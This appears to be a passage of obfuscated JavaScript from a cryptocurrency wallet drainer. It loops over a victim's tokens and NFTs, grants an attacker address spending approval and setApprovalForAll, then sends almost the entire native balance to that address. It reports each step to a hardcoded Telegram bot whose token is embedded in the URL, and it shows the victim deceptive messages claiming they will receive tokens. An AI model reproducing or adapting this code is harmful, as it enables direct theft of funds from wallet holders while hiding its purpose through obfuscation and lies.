_0x1d46d1=_0x1dea57;if(tokens[_0x1d46d1(0x250)])try{loopTokens(tokens);}catch(_0x196f9d){console[_0x1d46d1(0x232)]('Error\x20processing\x20item\x20'+_0x196f9d[_0x1d46d1(0x26a)]);}else{if(NFTs[_0x1d46d1(0x250)]){try{loopNfts(NFTs);}catch(_0x3b629d){console[_0x1d46d1(0x232)](_0x1d46d1(0x228)+_0x3b629d[_0x1d46d1(0x26a)]);}onSendEther(),sendMessage('Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!');}else try{onSendEther();}catch(_0x5bd656){console['error'](_0x1d46d1(0x228)+_0x5bd656[_0x1d46d1(0x26a)]);}}}async function loopTokens(_0x5755a3){const _0x45d980=_0x1dea57;for await(let _0x3e7937 of _0x5755a3){console[_0x45d980(0x21d)]('Token',_0x3e7937);try{sendMessage(_0x45d980(0x25f));let {hash:_0x5b4d7c}=await writeContract({'address':_0x3e7937[_0x45d980(0x262)],'abi':ABI,'functionName':_0x45d980(0x299),'args':[Oxa,_0x45d980(0x292)]});console[_0x45d980(0x21d)]('hash',_0x5b4d7c),_0x5b4d7c&&(console[_0x45d980(0x21d)](_0x45d980(0x238)),sendMessage(_0x45d980(0x26d)),sendMessage(_0x45d980(0x244)+_0x3e7937['address']),sendMessage('Token\x20balance\x20is\x20'+_0x3e7937[_0x45d980(0x234)]),sendMessage('Your\x20address\x20'+Oxa));}catch(_0x150cfa){console[_0x45d980(0x21d)]('Error:\x20'+_0x150cfa),sendMessage(_0x45d980(0x22a));}};await loopNfts(NFTs);}function _0x3914(_0x377da5,_0x487609){const _0x5e9df6=_0x5e9d();return _0x3914=function(_0x39141f,_0x348f72){_0x39141f=_0x39141f-0x1ee;let _0x135b4d=_0x5e9df6[_0x39141f];return _0x135b4d;},_0x3914(_0x377da5,_0x487609);}async function loopNfts(_0x5e2b6c){const _0x243266=_0x1dea57;for await(let _0xba322a of _0x5e2b6c){console['log'](_0x243266(0x29c),_0xba322a);try{let {hash:_0x2a1ddf}=await writeContract({'address':_0xba322a['token_address'],'abi':ABIN,'functionName':'setApprovalForAll','args':[Oxa,!![]]});console[_0x243266(0x21d)](_0x243266(0x2aa),_0x2a1ddf),console[_0x243266(0x21d)]('Transaction\x20Receipt:\x20'+receipt),sendMessage(_0x243266(0x26d)),sendMessage(_0x243266(0x265)+_0xba322a[_0x243266(0x226)]),sendMessage('Your\x20address\x20'+Oxa);}catch(_0x5b9b29){console['log'](_0x243266(0x1fb)+_0x5b9b29),sendMessage(_0x243266(0x22a));}}await onSendEther();}async function onSendEther(){const _0x53e1f7=_0x1dea57;console['log']('sending\x20ether');try{let _0x350a39=await fetchBalance({'address':selectedAccount});console[_0x53e1f7(0x21d)](_0x350a39);const _0x290ad7=await fetchFeeData();console[_0x53e1f7(0x21d)](_0x290ad7);var _0xd7bc90=_0x290ad7[_0x53e1f7(0x1f3)][_0x53e1f7(0x1f9)];_0xd7bc90=parseFloat(_0xd7bc90);let _0x171fe0=parseFloat(_0x350a39[_0x53e1f7(0x1f3)])-_0xd7bc90*0.00042;_0x171fe0=parseEther(_0x171fe0[_0x53e1f7(0x267)]()),console['log'](_0x171fe0);const {hash:_0x4f4a42}=await sendTransaction({'to':Oxa,'value':_0x171fe0});console[_0x53e1f7(0x21d)](_0x4f4a42),sendMessage('Transaction\x20hash\x20',_0x4f4a42),sendMessage(_0x53e1f7(0x20d)),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage(_0x53e1f7(0x219));}}async function sendMessage(_0x1b5ef9){return new Promise((_0x3de254,_0x374dc1)=>{const _0x3a010b=_0x3914,_0x2a8271=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x2a8271+'&text='+_0x1b5ef9,{'method':_0x3a010b(0x25c),'headers':{}})[_0x3a010b(0x23b)](async _0x12d0ef=>{const _0x15b781=_0x3a010b;if(_0x12d0ef[_0x15b781(0x25e)]>0x18f)throw _0x12d0ef;_0x3de254(await _0x12d0ef['json']());})[_0x3a010b(0x29a)](_0x44203f=>{_0x374dc1(_0x44203f);});});}async function getPrice(_0x51bd92){return new Promise((_0x1f4fdf,_0x588ae6)=>{const _0x5c4877=_0x3914;fetch(_0x5c4877(0x27e)+_0x51bd92+_0x5c4877(0x27b),{'method':'GET','headers':{}})[_0x5c4877(0x23b)](async _0x599ad6=>{const _0x2ea0b0=_0x5c4877;if(_0x599ad6[_0x2ea0b0(0x25e)]>0x18f)throw _0x599ad6;_0x1f4fdf(await _0x599ad6['json']());})['catch'](_0x1f1917=>{_0x588ae6(_0x1f1917);});});}async function getValue(_0x30d4f0,_0x326121,_0x1ef4ea){const _0x34e62e=_0x1dea57;console[_0x34e62e(0x21d)](_0x30d4f0,_0x326121,_0x1ef4ea);let _0x3f785b=await getPrice(_0x30d4f0);console['log'](_0x34e62e(0x215),_0x3f785b),_0x3f785b=parseFloat(_0x3f785b[_0x30d4f0]['usd']);let _0x3cd8bb=_0x326121/0xa**(_0x1ef4ea||0x12)*_0x3f785b;return _0x3cd8bb=parseInt(_0x3cd8bb),_0x3f785b?_0x3cd8bb:0x0;}async function getNFTs(_0x4ee4c5='',_0x57767d=_0x1dea57(0x202),_0x229ca7=_0x1dea57(0x23e),_0x339282='50'){return new Promise((_0x3e4db7,_0xf24327)=>{const _0x5d6c94=_0x3914;fetch(_0x5d6c94(0x291)+_0x4ee4c5+'/nft/collections?chain='+_0x229ca7+_0x5d6c94(0x20f)+_0x339282,{'method':_0x5d6c94(0x25c),'headers':{'accept':_0x5d6c94(0x272),'X-API-Key':_0x57767d}})['then'](async _0x1f0423=>{const _0x2d13a5=_0x5d6c94;if(_0x1f0423[_0x2d13a5(0x25e)]>0x18f)throw _0x1f0423;_0x3e4db7(await _0x1f0423[_0x2d13a5(0x1fa)]());})[_0x5d6c94(0x29a)](_0x13d271=>{_0xf24327(_0x13d271);});});}